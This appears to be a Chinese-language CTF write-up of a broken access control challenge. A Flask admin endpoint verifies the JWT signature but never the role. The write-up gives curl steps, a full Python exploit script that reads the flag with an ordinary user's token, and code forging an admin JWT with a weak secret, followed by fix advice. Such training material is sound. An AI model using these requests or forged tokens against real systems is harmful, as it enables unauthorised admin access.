# A01 Broken Access Control - Medium - WriteUP

## 漏洞分析

本题是一个典型的**前端权限控制绕过**漏洞，属于失效的访问控制（Broken Access Control）。

### 漏洞原理

应用程序采用了"前端控制权限"的错误设计：

1. **前端**：JavaScript 根据 JWT payload 中的 `role` 字段决定是否渲染管理员面板链接
2. **后端**：`/api/admin/flag` 接口只验证了 JWT 的签名是否有效（token 是否被篡改），但没有验证 `role` 是否为 `admin`

这意味着，普通用户登录后虽然前端看不到管理员入口，但**直接调用后端管理员 API 接口**即可获取 flag。

### 漏洞代码分析

```python
@app.route("/api/admin/flag")
def admin_flag():
    auth_header = request.headers.get("Authorization", "")
    if not auth_header.startswith("Bearer "):
        return jsonify({"error": "未提供Token"}), 401

    token = auth_header[7:]
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    except jwt.InvalidTokenError:
        return jsonify({"error": "无效的Token"}), 401

    # BUG: 没有检查 payload["role"] == "admin"
    return jsonify({"flag": FLAG, ...})
```

**正确做法**应该是：
```python
if payload.get("role") != "admin":
    return jsonify({"error": "权限不足"}), 403
```

## 利用步骤

### 步骤1：登录获取普通用户 JWT

```bash
curl -X POST http://<target>/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}'
```

返回：
```json
{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIifQ.xxx"}
```

### 步骤2：解码 JWT 查看内容

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIifQ.xxx" | cut -d. -f2 | base64 -d 2>/dev/null
```

可以看到 payload：
```json
{"username":"alice","role":"user"}
```

### 步骤3：直接调用管理员接口

将获取到的 token 用于访问管理员接口：

```bash
curl http://<target>/api/admin/flag \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFsaWNlIiwicm9sZSI6InVzZXIifQ.xxx"
```

返回：
```json
{
  "message": "管理员接口调用成功",
  "flag": "flag{...}",
  "user": "alice",
  "role": "user"
}
```

### 完整 EXP 脚本

```python
import requests
import base64
import json

target = "http://<target>"

# 1. 登录
r = requests.post(f"{target}/api/login", json={
    "username": "alice",
    "password": "alice123"
})
token = r.json()["token"]
print(f"[*] Got token: {token}")

# 2. 查看 JWT payload
parts = token.split(".")
payload = json.loads(base64.b64decode(parts[1] + "=="))
print(f"[*] Token payload: {payload}")

# 3. 调用管理员接口
r = requests.get(f"{target}/api/admin/flag", headers={
    "Authorization": f"Bearer {token}"
})
print(f"[*] Response: {r.json()}")
```

## 进阶思考：JWT 密钥弱是否可以伪造？

本题中 JWT 使用了弱密钥 `weak_secret_key_123`，如果尝试爆破或伪造：

```python
import jwt

# 伪造 admin token
fake_token = jwt.encode(
    {"username": "hacker", "role": "admin"},
    "weak_secret_key_123",
    algorithm="HS256"
)
```

但即使不伪造 token，直接使用普通用户的 token 也能成功，这正是本题的核心考点——**后端权限校验缺失**。

## 修复建议

1. **后端必须进行权限校验**：所有敏感操作都应在后端进行权限验证，不能依赖前端隐藏UI
2. **最小权限原则**：API 接口默认拒绝访问，只有满足权限条件的请求才放行
3. **JWT 使用强密钥**：避免使用弱密钥，防止被爆破

示例修复代码：

```python
@app.route("/api/admin/flag")
def admin_flag():
    auth_header = request.headers.get("Authorization", "")
    if not auth_header.startswith("Bearer "):
        return jsonify({"error": "未提供Token"}), 401

    token = auth_header[7:]
    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    except jwt.InvalidTokenError:
        return jsonify({"error": "无效的Token"}), 401

    # 修复：校验角色权限
    if payload.get("role") != "admin":
        return jsonify({"error": "权限不足，需要管理员角色"}), 403

    return jsonify({"flag": FLAG})
```
